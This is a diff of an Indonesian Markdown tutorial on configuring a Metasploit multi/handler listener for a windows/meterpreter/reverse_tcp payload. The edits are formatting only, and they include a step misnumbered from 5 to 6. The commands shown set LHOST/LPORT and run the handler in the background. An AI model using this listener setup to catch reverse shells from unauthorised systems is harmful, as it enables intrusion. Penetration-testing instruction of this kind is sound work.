@@ -12,19 +12,19 @@ Modul ini tidak mengeksploitasi, tapi hanya mendengarkan dan menangani koneksi m
 
 ## B. Langkah-Langkah Membuat Listener
 
-### 1. Jalankan Metasploit Framework:
+1. Jalankan Metasploit Framework:
 
    ```
    msfconsole
    ```
 
-### 2. Pilih Modul multi/handler:
+2. Pilih Modul multi/handler:
 
    ```
    use exploit/multi/handler
    ```
 
-### 3. Tentukan Payload yang Sesuai
+3. Tentukan Payload yang Sesuai
 
    Contoh jika payload yang dikirim adalah `windows/meterpreter/reverse_tcp`:
 
@@ -33,27 +33,28 @@ Modul ini tidak mengeksploitasi, tapi hanya mendengarkan dan menangani koneksi m
 
    ```
 
-### 4. Atur IP dan Port Listener:
+4. Atur IP dan Port Listener:
 
    ```
    set LHOST 192.168.1.100
    set LPORT 4444
    ```
 
+   Keterangan:
    - **LHOST**: IP Attacker (listener)
    - **LPORT**: Port tempat menerima koneksi
 
-### 5. Jalankan Listener:
+6. Jalankan Listener:
 
-  ```
-  run
-  ```
+   ```
+   run
+   ```
 
-  Atau bisa juga:
+   Atau bisa juga:
 
-  ```
-  exploit
-  ```
+   ```
+   exploit
+   ```
 
 ## C. Contoh Lengkap: Listener untuk Payload Windows:
 
@@ -83,6 +84,7 @@ Kalau ingin listener tetap berjalan di background:
 exploit -j -z
 ```
 
+Keterangan:
 - `-j`: Jalankan sebagai job (background)
 - `-z`: Tidak membuka sesi interaktif secara langsung
 
